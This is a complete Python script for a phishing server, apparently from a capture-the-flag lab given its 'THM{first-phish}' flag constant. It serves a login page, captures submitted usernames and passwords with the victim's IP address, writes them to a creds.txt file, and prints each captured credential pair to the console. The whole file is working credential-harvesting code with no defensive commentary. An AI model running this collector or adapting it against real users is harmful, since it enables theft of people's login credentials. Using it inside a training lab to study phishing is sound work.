#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse, os, sys, datetime

HOST = '0.0.0.0'
PORT = 8000
HERE = os.path.dirname(os.path.abspath(__file__))
CREDS_FILE = os.path.join(HERE, 'creds.txt')
FLAG = "THM{first-phish}"

class H(BaseHTTPRequestHandler):
    def log(self, msg):
        ts = datetime.datetime.now().isoformat(sep=' ', timespec='seconds')
        line = f"[{ts}] {msg}"
        print(line, flush=True)

    def do_GET(self):
        if self.path in ('/', '/index.html'):
            self.send_response(200)
            self.send_header('Content-Type','text/html; charset=utf-8')
            self.end_headers()
            with open(os.path.join(HERE,'index.html'),'rb') as f:
                self.wfile.write(f.read())
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        if self.path == '/submit':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode('utf-8')
            data = urllib.parse.parse_qs(body)
            user = data.get('username',[''])[0]
            pw = data.get('password',[''])[0]

            with open(CREDS_FILE, 'a') as fh:
                fh.write(f"{datetime.datetime.now().isoformat()}\t{self.client_address[0]}\t{user}\t{pw}\n")

            self.log(f"Captured -> username: {user}    password: {pw}    from: {self.client_address[0]}")

            self.send_response(303)
            self.send_header('Location', '/')
            self.end_headers()
            return

        self.send_response(404)
        self.end_headers()

if __name__ == '__main__':
    print("Starting server on http://%s:%d" % (HOST, PORT))
    httpd = HTTPServer((HOST, PORT), H)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Shutting down")
        httpd.server_close()
        sys.exit(0)
